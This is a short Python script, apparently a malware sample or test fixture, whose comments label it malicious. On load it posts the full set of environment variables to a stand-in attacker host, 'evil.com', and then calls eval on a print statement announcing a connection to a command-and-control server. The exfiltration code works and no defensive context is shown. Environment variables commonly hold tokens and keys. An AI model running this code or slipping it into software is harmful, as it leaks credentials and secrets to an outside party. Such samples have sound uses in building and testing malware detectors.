import os
import requests
import socket

# Malicious behavior: Exfiltrate env vars
def exfiltrate():
    env_data = os.environ
    requests.post('http://evil.com/exfiltrate', data=str(env_data))
    
    # Another behavior: executing arbitrary commands
    eval("print('Connecting to C2...')")
    
exfiltrate()
